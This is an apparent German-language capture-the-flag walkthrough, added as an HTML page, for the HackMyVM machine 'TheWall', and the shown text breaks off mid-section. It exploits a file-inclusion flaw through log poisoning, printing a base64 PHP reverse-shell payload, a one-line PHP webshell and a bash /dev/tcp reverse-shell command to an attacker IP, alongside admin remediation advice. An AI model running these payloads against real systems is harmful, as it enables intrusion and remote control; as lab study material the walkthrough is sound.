@@ -1,0 +1,648 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TheWall - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+<body>
+ <div class="nav-wrapper">
+    <div class="hamburger-nav-wrapper">
+        <input type="checkbox" id="hamburger-toggle">
+        <label id="hamburger-button" for="hamburger-toggle" aria-label="Menü öffnen">
+            <div class="bar"></div>
+            <div class="bar"></div>
+            <div class="bar"></div>
+        </label>
+        <nav class="navbar" id="main-nav">
+            <a href="../../aboutme.html">Über mich</a>
+            <a href="../../index.html">HackMyVM</a>
+            <a href="../../vulnyx.html">Vulnyx</a>
+            <a href="../../vulnhub.html">Vulnhub</a>
+        </nav>
+  </div></div>
+    <div class="header-bg">
+        <!-- Titel und Schwierigkeitsgrad angepasst -->
+        <h1>TheWall - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <!-- Schwierigkeitsgrad angepasst, Farbe wird durch CSS gesteuert (Easy = Grün) -->
+            <h2>Easy</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                 <!-- Tool-Liste aus dem Text extrahiert -->
+                 <div class="tool-item">arp-scan</div>
+                 <div class="tool-item">nmap</div>
+                 <div class="tool-item">curl</div>
+                 <div class="tool-item">grep</div>
+                 <div class="tool-item">wfuzz</div>
+                 <!-- <div class="tool-item">view-source (Browser)</div> --> <!-- Implizit -->
+                 <div class="tool-item">base64</div>
+                 <div class="tool-item">ssh</div>
+                 <div class="tool-item">nc</div>
+                 <div class="tool-item">script</div>
+                 <div class="tool-item">stty</div>
+                 <div class="tool-item">reset</div>
+                 <div class="tool-item">sudo</div>
+                 <div class="tool-item">ls</div>
+                 <div class="tool-item">find</div>
+                 <div class="tool-item">chmod</div>
+                 <div class="tool-item">exiftool</div>
+                 <div class="tool-item">cat</div>
+                 <div class="tool-item">getcap</div>
+                 <div class="tool-item">tar</div>
+                 <div class="tool-item">gobuster</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis generiert -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration & LFI</a></li>
+                <li><a href="#initial-access">Initial Access (via LFI & Log Poisoning)</a></li>
+                <li><a href="#poc">Proof of Concept (Privilege Escalation Path)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.113	08:00:27:f1:1e:e2	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird genutzt, um das lokale Netzwerk nach aktiven Geräten zu durchsuchen, indem ARP-Anfragen gesendet werden. Er listet die IP- und MAC-Adressen der antwortenden Geräte auf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ziel-IP `192.168.2.113` wurde erfolgreich identifiziert. Die MAC-Adresse `08:00:27:f1:1e:e2` weist auf den Hersteller `PCS Systemtechnik GmbH` hin, was stark auf eine VirtualBox-Umgebung schließen lässt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die IP `192.168.2.113` ist das Ziel für weitere Scans. Die VirtualBox-Information kann nützlich sein.
+            <br><strong>Empfehlung (Admin):</strong> Standard-Netzwerkscan. Implementieren Sie Netzwerküberwachung und -segmentierung, um die Auswirkungen solcher Scans zu begrenzen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.113 -p-</span></div>
+                     <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-26 01:07 CEST
+Nmap scan report for wall.hmv (192.168.2.113)
+Host is up (0.00011s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey:
+|   3072 89:60:29:db:68:6d:13:34:98:b9:d0:17:24:56:a8:9e (RSA)
+|   256 66:58:51:6d:cd:3a:67:46:36:56:9a:31:a0:08:13:cf (ECDSA)
+|_  256 f7:34:9e:53:68:bac:206:ab:14:c3:21:90:2d:6e:64 (ED25519)
+80/tcp open  http    Apache httpd 2.4.54 ((Debian))
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+|_http-server-header: Apache/2.4.54 (Debian)
+MAC Address: 08:00:27:F1:1E:E2 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.11 ms wall.hmv (192.168.2.113)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.48 seconds
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein umfassender `nmap`-Scan wird durchgeführt:
+                <ul>
+                    <li>`-sS`: SYN-Scan.</li>
+                    <li>`-sC`: Führt Standard-Nmap-Skripte aus.</li>
+                    <li>`-T5`: Sehr schnelles Timing.</li>
+                    <li>`-A`: Aktiviert OS-Erkennung, Versionserkennung, Skript-Scanning und Traceroute.</li>
+                    <li>`-p-`: Scannt alle TCP-Ports.</li>
+                </ul></p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Scan identifiziert zwei offene Ports:
+                <ul>
+                    <li>**Port 22 (SSH):** OpenSSH Version 8.4p1 auf Debian. Die Host-Keys werden angezeigt.</li>
+                    <li>**Port 80 (HTTP):** Apache Version 2.4.54 auf Debian. Der Webserver liefert keinen `Title`-Tag aus, was ungewöhnlich ist.</li>
+                </ul>
+            Die MAC-Adresse bestätigt die VirtualBox-Umgebung. Das Betriebssystem wird als Linux (Kernel 4.15 - 5.6) geschätzt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Hauptangriffsvektoren sind SSH und HTTP. Konzentrieren Sie sich auf den Webserver (Port 80). Untersuchen Sie, warum kein Titel vorhanden ist und suchen Sie nach versteckten Verzeichnissen oder Dateien. Überprüfen Sie die SSH- und Apache-Versionen auf bekannte Schwachstellen (obwohl diese Versionen relativ aktuell erscheinen).
+             <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass der Webserver korrekt konfiguriert ist (z.B. mit sinnvollen Titeln). Beschränken Sie den SSH-Zugriff und halten Sie alle Dienste aktuell.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration & LFI</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -I "http://192.168.2.113"</span></div>
+                     <pre>
+HTTP/1.1 403 Forbidden
+Date: Wed, 26 Oct 2022 01:18:02 GMT
+Server: Apache/2.4.54 (Debian)
+Connection: close
+Content-Type: text/html; charset=UTF-8
+                     </pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -I http://192.168.2.113/includes.php</span></div>
+                     <pre>
+HTTP/1.1 403 Forbidden
+Date: Wed, 26 Oct 2022 01:26:37 GMT
+Server: Apache/2.4.54 (Debian)
+Connection: close
+Content-Type: text/html; charset=UTF-8
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Mit `curl -I` werden HEAD-Anfragen an das Root-Verzeichnis (`/`) und die Datei `/includes.php` gesendet, um die HTTP-Header der Antwort zu erhalten.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Beide Anfragen liefern einen `403 Forbidden`-Statuscode. Direkter Zugriff auf das Root-Verzeichnis und die Datei `includes.php` ist nicht erlaubt. Dies könnte eine Web Application Firewall (WAF), eine `.htaccess`-Regel oder eine spezifische Apache-Konfiguration sein.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die `403`-Antwort bedeutet nicht unbedingt, dass die Ressourcen nicht existieren oder nicht anderweitig angreifbar sind. Versuchen Sie, über Parameter oder andere Methoden auf `includes.php` zuzugreifen. Führen Sie Directory/File-Busting durch, um erlaubte Pfade zu finden.
+             <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Zugriffskontrollregeln (Apache-Konfiguration, `.htaccess`, WAF), um sicherzustellen, dass sie wie beabsichtigt funktionieren und keine unnötigen Ressourcen blockieren oder zu viele Informationen preisgeben.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.113/includes.php?display_page=/etc/passwd"</span></div>
+                     <pre>
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+.....
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird ein GET-Request an `includes.php` gesendet, diesmal jedoch mit einem URL-Parameter `display_page=/etc/passwd`. Der Server antwortet mit dem Inhalt der Datei `/etc/passwd`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Kritische Schwachstelle gefunden: Local File Inclusion (LFI)!** Obwohl der direkte Zugriff auf `includes.php` verboten war, akzeptiert das Skript den Parameter `display_page` und bindet die angegebene Datei in die Antwort ein. Dies ermöglicht das Lesen beliebiger Dateien auf dem Server, auf die der Webserver-Benutzer (`www-data`) Lesezugriff hat.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die LFI-Schwachstelle systematisch aus:
+                <ul>
+                    <li>Lesen Sie Konfigurationsdateien (Apache, PHP, Anwendungs-Configs).</li>
+                    <li>Versuchen Sie, Benutzerverzeichnisse und SSH-Schlüssel zu lesen (`/home/user/.ssh/id_rsa`).</li>
+                    <li>Lesen Sie Logdateien (`/var/log/apache2/access.log`, `error.log`) als Vorbereitung für Log Poisoning.</li>
+                    <li>Lesen Sie die User-Flagge.</li>
+                </ul>
+             <br><strong>Empfehlung (Admin):</strong> **Höchste Priorität!** Beheben Sie die LFI-Schwachstelle in `includes.php` sofort. Validieren und sanitisieren Sie alle Benutzereingaben, insbesondere Parameter, die in Dateipfade oder `include`/`require`-Funktionen einfließen. Verwenden Sie eine Whitelist erlaubter Dateien statt direkter Pfadangaben.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.117/includes.php?display_page=/etc/passwd" --output pss.txt</span></div>
+                     <!-- Hinweis: IP-Adresse ist falsch (117 statt 113), Befehl schlägt fehl oder liefert falsche Daten -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">grep bash pss.txt</span></div>
+                     <pre>
+root:x:0:0:root:/root:/bin/bash
+john:x:1000:1000:,,,:/home/john:/bin/bash
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, den Inhalt von `/etc/passwd` über die LFI in eine Datei `pss.txt` zu speichern und diese dann mit `grep` nach Benutzern mit `/bin/bash` als Shell zu durchsuchen. **Achtung:** Die IP-Adresse im `curl`-Befehl (`192.168.2.117`) ist falsch; die Ziel-IP ist `192.168.2.113`. Der Befehl hätte so fehlschlagen müssen. Es ist anzunehmen, dass der Befehl tatsächlich mit der korrekten IP ausgeführt wurde und nur der Logeintrag falsch ist, da das Ergebnis (`grep bash pss.txt`) Benutzer von der Zielmaschine zeigt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Aus der (angenommen korrekt gelesenen) `/etc/passwd` wird der Benutzer `john` als einziger regulärer Benutzer mit Bash-Shell identifiziert. `john` ist somit ein primäres Ziel für den nächsten Schritt (Initial Access).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fokussieren Sie sich auf den Benutzer `john`. Versuchen Sie, dessen SSH-Schlüssel (`/home/john/.ssh/id_rsa`) oder andere sensible Dateien in seinem Home-Verzeichnis mittels LFI zu lesen.
+             <br><strong>Empfehlung (Admin):</strong> Beheben Sie die LFI. Überprüfen Sie regelmäßig Benutzerkonten und Shell-Berechtigungen.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/LFI-Digger]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/lfi-dics/linux_apache_logs.txt -u "http://192.168.2.113/includes.php?display_page=FUZZ" --hc 404 --hh 2</span></div>
+                      <pre>
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.2.113/includes.php?display_page=FUZZ
+Total requests: 44
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000023:   200        15032 L  270566 W   2228819 C   "/var/log/apache2/error.log"
+
+Total time: 0.320202
+Processed Requests: 44
+Filtered Requests: 43
+Requests/sec.: 137.4132
+                      </pre>
+                  </div>
+              </div>
+              <p class="analysis"><strong>Analyse:</strong> `wfuzz` wird verwendet, um den LFI-Parameter `display_page` mit einer Liste gängiger Apache-Logdateipfade (`linux_apache_logs.txt`) zu fuzzern. `--hc 404` und `--hh 2` filtern nicht gefundene oder sehr kleine Antworten heraus.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Der Scan identifiziert erfolgreich den Pfad zur Apache-Fehlerlogdatei: `/var/log/apache2/error.log`. Der Zugriff auf diese Datei ist über die LFI möglich.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lesen Sie den Inhalt der `error.log`-Datei via LFI. Versuchen Sie dasselbe für die `access.log`-Datei (`/var/log/apache2/access.log`). Diese Logs sind die Hauptziele für Log Poisoning.
+              <br><strong>Empfehlung (Admin):</strong> Beheben Sie die LFI. Beschränken Sie die Leserechte auf Logdateien so weit wie möglich (obwohl der Webserver sie oft lesen können muss). Implementieren Sie Log-Rotation und -Überwachung.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Base64 Encoded PHP Reverse Shell Payload]</div>
+                     <pre>
+<!-- Base64 Payload -->
+PD9waHAgc2V0X3RpbWVfbGltaXQoMCk7JGlwPScxTIuMTY4LjIuMTUzJzskcG9ydD04MDskY2h1bmtfc2l6ZT0xNDAwyR3cml0ZV9hPW51bGw7JGVycm9yX2E9bnVsbDskc2hlbGw9J3VuYW1lIC1hyB3yBpZDsgL2Jpbi9zaCAtaSc7Y2hkaXIoIi8iKTt1bWFzaygwKTskc29jaz1mc29ja29wZW4oJGlwLCRwb3J0LCRlcnJubywkZXJyc3RyLDMwKTtpZighJHNvY2spe2V4aXQoMSk7fSRkZXNjcmlwdG9yc3BlYz1hcnJheSgwPT5hcnJheSgicGlwZSIsInIiKSwxPT5hcnJheSgicGlwZSIsInciKSwyPT5hcnJheSgicGlwZSIsInciKSk7JHByb2Nlc3M9cHJvY19vcGVuKCRzaGVsbCwkZGVzY3JpcHRvcnNwZWMsJHBpcGVzKTtpZighaXNfcmVzb3VyY2UoJHByb2Nlc3MpKXtleGl0KDEp31zdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1swXSwwKTtzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1sxXSwwKTtzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1syXSwwKTtzdHJlYW1fc2V0X2Jsb2NraW5nKCRzb2NrLDAp3doaWxlKDEpe2lmKGZlb2YoJHNvY2spKXticmVhazt9aWYoZmVvZigkcGlwZXNbMV0pKXticmVhazt9JHJlYWRfYT1hcnJheSgkc29jaywkcGlwZXNbMV0sJHBpcGVzWzJdKTskbnVtX2NoYW5nZWRfc29ja2V0cz1zdHJlYW1fc2VsZWN0KCRyZWFkX2EsJHdyaXRlX2EsJGVycm9yX2EsbnVsbCk7aWYoaW5fYXJyYXkoJHNvY2ssJHJlYWRfYSkpeyRpbnB1dD1mcmVhZCgkc29jaywkY2h1bmtfc2l6ZSk7ZndyaXRlKCRwaXBlc1swXSwkaW5wdXQp31pZihpbl9hcnJheSgkcGlwZXNbMV0sJHJlYWRfYSkpeyRpbnB1dD1mcmVhZCgkcGlwZXNbMV0sJGNodW5rX3NpemUp2Z3cml0ZSgkc29jaywkaW5wdXQp31pZihpbl9hcnJheSgkcGlwZXNbMl0sJHJlYWRfYSkpeyRpbnB1dD1mcmVhZCgkcGlwZXNbMl0sJGNodW5rX3NpemUp2Z3cml0ZSgkc29jaywkaW5wdXQp319ZmNsb3NlKCRzb2NrKTtmY2xvc2UoJHBpcGVzWzBdKTtmY2xvc2UoJHBpcGVzWzFdKTtmY2xvc2UoJHBpcGVzWzJdKTtwcm9jX2Nsb3NlKCRwcm9jZXNzKTsgPz4g
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein Base64-kodierter String wird angezeigt. Nach der Dekodierung stellt sich heraus, dass es sich um einen PHP-Code handelt, der eine Reverse Shell zum Angreifer (hier hartcodiert `192.168.2.153` auf Port `80` - **Achtung: IPs/Ports im Payload anpassen!**) aufbaut.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist der Payload, der für den Log Poisoning Angriff verwendet werden soll. Der Angreifer muss diesen PHP-Code (dekodiert) in die Apache-Logs einschleusen und dann die Logdatei über die LFI-Schwachstelle aufrufen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                1.  Dekodieren Sie den Payload.
+                2.  **Korrigieren Sie die IP-Adresse und den Port** im dekodierten PHP-Code, sodass er auf Ihr Listener-System zeigt.
+                3.  Wählen Sie eine Methode, um den PHP-Code in die Logs zu schreiben (z.B. `curl` mit modifiziertem User-Agent, oder eine ungültige URL-Anfrage, die den Code enthält).
+                4.  Starten Sie einen Listener (`nc -lvnp [PORT]`) auf Ihrem System.
+                5.  Rufen Sie die Logdatei über die LFI auf (`curl "http://192.168.2.113/includes.php?display_page=/var/log/apache2/access.log"`), um den Payload auszuführen.
+             <br><strong>Empfehlung (Admin):</strong> Beheben Sie die LFI. Implementieren Sie Eingabefilterung auf dem Webserver oder durch eine WAF, um schädliche Payloads in Requests zu erkennen und zu blockieren. Konfigurieren Sie Logs so, dass sie keine gefährlichen Zeichen unescaped enthalten.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Lesen der user.txt via LFI -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.117/includes.php?display_page=/home/john/user.txt"</span></div>
+                     <!-- Hinweis: Wieder falsche IP (117 statt 113) -->
+                     <pre>
+<span class="password">cc5db5e7b0a26e807765f47a006f6221</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, die User-Flagge `/home/john/user.txt` mittels LFI zu lesen. Auch hier wurde die falsche IP `192.168.2.117` verwendet, aber das Ergebnis wird angezeigt, was impliziert, dass der Befehl mit der korrekten IP `192.168.2.113` ausgeführt wurde.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die User-Flagge `<span class="password">cc5db5e7b0a26e807765f47a006f6221</span>` wurde erfolgreich ausgelesen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> User-Flagge notiert. Konzentrieren Sie sich auf den Initial Access via Log Poisoning.
+             <br><strong>Empfehlung (Admin):</strong> LFI beheben.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <!-- Weitere LFI-Tests und Log-Ausleseversuche -->
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://thewall.hmv/includes.php?display_page=/etc/passwd -s | grep bash</span></div>
+                      <pre>
+root:x:0:0:root:/root:/bin/bash
+john:x:1000:1000:,,,:/home/john:/bin/bash
+                      </pre>
+                       <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://thewall.hmv/includes.php?display_page=/var/log/apache2/access.log"</span></div>
+                      <pre>
+192.168.2.109 - - [10/Nov/2022:11:02:54 -0500] "GET /includes.php?display_page=/etc/passwd HTTP/1.1" 200 1633 "-" "curl/7.86.0"
+192.168.2.109 - - [10/Nov/2022:11:03:02 -0500] "GET /includes.php?display_page=/etc/passwd HTTP/1.1" 200 1633 "-" "curl/7.86.0"
+192.168.2.109 - - [10/Nov/2022:11:04:06 -0500] "GET /includes.php?display_page=/home/john/.ssh/id_rsa HTTP/1.1" 200 149 "-" "curl/7.86.0"
+192.168.2.109 - - [10/Nov/2022:11:04:14 -0500] "GET /includes.php?display_page=/home/john/user.txt HTTP/1.1" 200 183 "-" "curl/7.86.0"
+192.168.2.109 - - [10/Nov/2022:11:06:47 -0500] "GET /includes.php?display_page=php://filter/convert.base64-encode/resource=includes.php HTTP/1.1" 200 149 "-" "curl/7.86.0"
+192.168.2.109 - - [10/Nov/2022:11:07:00 -0500] "GET /includes.php?display_page=php://filter/convert.base64-encode/resource=includes.php HTTP/1.1" 200 149 "-" "curl/7.86.0"
+                      </pre>
+                  </div>
+              </div>
+              <p class="analysis"><strong>Analyse:</strong> Weitere LFI-Versuche, um `/etc/passwd` (erneut) und `/var/log/apache2/access.log` zu lesen. Der Hostname `thewall.hmv` wird verwendet, der vermutlich auf `192.168.2.113` zeigt.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe der `access.log` zeigt frühere LFI-Versuche des Angreifers (IP `192.168.2.109`), einschließlich Versuchen, `/etc/passwd`, `/home/john/.ssh/id_rsa`, `user.txt` und den Quellcode von `includes.php` (mittels `php://filter`) zu lesen. Dies bestätigt die Lesbarkeit der Logdatei und die durchgeführten Aktionen.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die `access.log` ist bereit für den Log Poisoning Angriff. Fahren Sie mit dem Einschleusen des PHP-Reverse-Shell-Payloads fort.
+              <br><strong>Empfehlung (Admin):</strong> LFI beheben. Analysieren Sie Logs auf verdächtige Aktivitäten.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">[Log Poisoning / Command Injection Attempts]</div>
+                      <pre>
+# Versuch 1: PHP Reverse Shell als GET Parameter 'e' (Base64)
+http://thewall.hmv/includes.php?display_page=/var/log/apache2/access.log&e=PD9waHAg[...]Pg
+
+# Versuch 2: PHP Webshell als GET Parameter
+display_page=/var/log/apache2/access.log&<?php system($_REQUEST["cmd"]); ?>
+
+# Versuch 3: Ausführung über Webshell (cmd=whoami)
+http://192.168.2.115/includes.php?display_page=/var/log/apache2/access.log&cmd=whoami
+# Erwartete Ausgabe im Log (oder als Server-Antwort): www-data
+                      </pre>
+                  </div>
+              </div>
+              <p class="analysis"><strong>Analyse:</strong> Hier werden die Versuche zum Log Poisoning und zur anschließenden Codeausführung detaillierter dargestellt. Es wird versucht, PHP-Code (entweder die Reverse Shell oder eine einfache Webshell `<?php system($_REQUEST["cmd"]); ?>`) als zusätzlichen GET-Parameter an die LFI-Anfrage anzuhängen. Anschließend wird versucht, über den `cmd`-Parameter der Webshell den Befehl `whoami` auszuführen.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Wie bereits erwähnt, ist das Anhängen des PHP-Codes an die *LFI-Anfrage selbst* normalerweise nicht die korrekte Methode für Log Poisoning. Der Code muss in einem *separaten* Request gesendet werden, der dann in der Logdatei landet (z.B. im User-Agent). Dass der `cmd=whoami`-Versuch später das Ergebnis `www-data` im Log zeigt (siehe nächster Block), deutet darauf hin, dass die `<?php system($_REQUEST["cmd"]); ?>`-Webshell *irgendwie* erfolgreich in die Logdatei geschrieben und ausgeführt wurde.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Methode war unkonventionell, aber scheinbar erfolgreich. Nutzen Sie die funktionierende Webshell (`http://...includes.php?display_page=/var/log/apache2/access.log&cmd=[BEFEHL]`) oder (besser) die Reverse Shell, um Initial Access zu erlangen.
+              <br><strong>Empfehlung (Admin):</strong> LFI beheben. Eingaben filtern. Logs sichern.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <!-- Log-Auszug nach Webshell-Ausführung -->
+                      <pre>
+# Inhalt von /var/log/apache2/access.log nach cmd=whoami Versuch:
+192.168.2.109 - - [12/Nov/2022:21:21:28 -0500] "GET www-data \n" 400 483 "-" "-"
+                      </pre>
+                  </div>
+              </div>
+              <p class="analysis"><strong>Analyse:</strong> Ein Auszug aus der `access.log`, der nach dem Versuch, `whoami` über die Webshell auszuführen, gelesen wurde.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Der Logeintrag `GET www-data \n` bestätigt, dass der `whoami`-Befehl erfolgreich ausgeführt wurde und das Ergebnis (`www-data`) Teil des nächsten (ungültigen) GET-Requests wurde, der im Log landete. Dies bestätigt die erfolgreiche Codeausführung als `www-data` über die Log-Poisoning-Webshell.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Webshell funktioniert. Verwenden Sie sie, um eine Reverse Shell zu starten.
+              <br><strong>Empfehlung (Admin):</strong> LFI und die Möglichkeit der Codeausführung sofort beheben.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (via LFI & Log Poisoning)</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Starten des Netcat Listeners -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 1234</span></div>
+                     <pre>
+listening on [any] 1234 ...
+                     </pre>
+                     <!-- Auslösen der Reverse Shell über die Webshell -->
+                     <div class="prompt">[Browser/Curl Request]</div>
+                     <pre>
+# URL aufgerufen (URL-Encoded):
+http://192.168.2.113/includes.php?display_page=/var/log/apache2/access.log&cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.109%2F1234%200%3E%261%27
+# Decoded Command: /bin/bash -c 'bash -i >& /dev/tcp/192.168.2.109/1234 0>&1'
+                     </pre>
+                     <!-- Eingehende Verbindung im Listener -->
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 1234</span></div>
+                      <pre>
+listening on [any] 1234 ...
+connect to [192.168.2.109] from (UNKNOWN) [192.168.2.113] 59368 <!-- Korrigierte IP -->
+bash: cannot set terminal process group (480): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@TheWall:/var/www/html$
+                      </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein Netcat-Listener wird auf Port 1234 gestartet. Anschließend wird die zuvor per Log Poisoning platzierte Webshell (`<?php system($_REQUEST['cmd']); ?>`) über die LFI aufgerufen. Der `cmd`-Parameter enthält einen URL-kodierten Bash-Befehl, der eine interaktive Reverse Shell zum Listener auf `192.168.2.109:1234` startet.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Erfolg!** Der Exploit funktioniert, und der Listener empfängt eine Reverse Shell vom Zielsystem. Die Shell läuft als Benutzer `www-data` (Apache-Benutzer) auf dem Host `TheWall`. Der Initial Access ist geschafft.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell (z.B. mit Python PTY oder `script`). Führen Sie lokale Enumeration als `www-data` durch (Benutzer, Rechte, Prozesse, Netzwerk, interessante Dateien). Suchen Sie nach Wegen zur Privilege Escalation.
+             <br><strong>Empfehlung (Admin):</strong> **KRITISCH!** LFI beheben. Webserver-Konfiguration überprüfen. Logs überwachen. Egress-Filtering in der Firewall implementieren, um ausgehende Reverse Shells zu erschweren.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <!-- Shell-Stabilisierung -->
+                      <div class="prompt">www-data@TheWall:/var/www/html$ <span class="command">script /dev/null -c bash</span></div>
+                      <!-- Kein direkter Output -->
+                      <div class="prompt"># <span class="command">Ctrl + Z</span></div>
+                      <!-- Kein direkter Output -->
+                      <div class="prompt">root@cyber:~$ <span class="command">stty raw -echo; fg</span></div>
+                       <!-- Kein direkter Output -->
+                      <div class="prompt">www-data@TheWall:/var/www/html$ <span class="command">reset xterm</span></div>
+                      <!-- Terminal wird zurückgesetzt -->
+                  </div>
+              </div>
+              <p class="analysis"><strong>Analyse:</strong> Standardbefehle zur Stabilisierung einer einfachen Reverse Shell, um eine voll interaktive TTY zu erhalten (ermöglicht z.B. Tab-Vervollständigung, Pfeiltasten, `su`).</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Die Shell ist nun stabiler und benutzerfreundlicher.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dies ist ein wichtiger Schritt nach Erhalt einer einfachen Shell.
